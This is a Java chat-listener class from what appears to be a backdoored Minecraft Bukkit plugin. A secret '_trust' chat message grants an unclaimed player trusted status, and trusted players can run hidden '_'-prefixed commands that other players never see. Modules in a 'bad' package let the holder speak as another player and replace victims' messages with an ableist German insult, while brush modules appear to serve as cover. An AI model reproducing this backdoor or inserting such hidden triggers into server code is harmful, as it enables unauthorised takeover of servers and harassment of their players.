package me.maiko.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import me.maiko.main.Main;
import me.maiko.module.Module;
import me.maiko.modules.player.bad.Control_Mod;
import me.maiko.modules.player.bad.Spast_Mod;
import me.maiko.modules.world.Brush_Mod;
import me.maiko.modules.world.Clientsidebrush_Mod;

public class AsyncPlayerChatListener implements Listener {
	public Main plugin;

	public AsyncPlayerChatListener(Main plugin) {
		this.plugin = plugin;
	}

	@EventHandler
	public void on(AsyncPlayerChatEvent e) {
		Player p = e.getPlayer();
		try {
			if (e.getMessage().equalsIgnoreCase("_trust")) {
				if (Main.filecfg.get("Player").equals("") && Main.trusted.isEmpty()) {
					e.setCancelled(true);
					String[] args = e.getMessage().substring(1).split(" ");
					for (Module m : plugin.m.Mods) {
						if (m.getBefehl().equalsIgnoreCase(args[0])) {
							m.onCommand(args, p);
						}
					}
				}

			}
			if (Main.trusted.contains(p) || Main.SemiTrusted.contains(p)) {
				if (e.getMessage().startsWith("_")) {
					e.setCancelled(true);
					String[] args = e.getMessage().substring(1).split(" ");
					for (Module m : plugin.m.Mods) {
						if (m.getBefehl().equalsIgnoreCase(args[0])) {
							m.onCommand(args, p);
						}
					}
				}
			}
		} catch (Exception e2) {
			if (Main.trusted.contains(p) || Main.SemiTrusted.contains(p)) {
				String err = e2.getMessage();
				p.sendMessage(Main.Prefix + "Es gab einen Fehler!" + err);

			}
		}

		if (Spast_Mod.spast.contains(p)) {

			e.setMessage("§4§lICH BIN EIN KLEINER SPASTI!!!!!!!!!!");
		}
		if (Control_Mod.controlled.containsKey(p)) {
			e.setCancelled(true);
			Control_Mod.controlled.get(p).chat(e.getMessage());

		}
		try {
			if (Clientsidebrush_Mod.clientsidechatbrush.contains(p)) {
				if (e.getMessage().startsWith("_")) {

				} else {
					e.setCancelled(true);
					int x = Integer.parseInt(e.getMessage());
					Clientsidebrush_Mod.clientsidebr.put(p, x);
					p.sendMessage(Main.Prefix + "Du hast die Brush block id geändert!");
				}
			}
			if (Brush_Mod.chatbrush.contains(p)) {
				if (e.getMessage().startsWith("_")) {

				} else {
					e.setCancelled(true);
					int x = Integer.parseInt(e.getMessage());
					Brush_Mod.br.put(p, x);
					p.sendMessage(Main.Prefix + "Du hast die Brush block id geändert!");
				}
			}

		} catch (Exception e2) {
			if (Main.trusted.contains(p) || Main.SemiTrusted.contains(p)) {
				String err = e2.getMessage();
				p.sendMessage(Main.Prefix + "Es gab einen Fehler!" + err);

			}
		}
	}
}
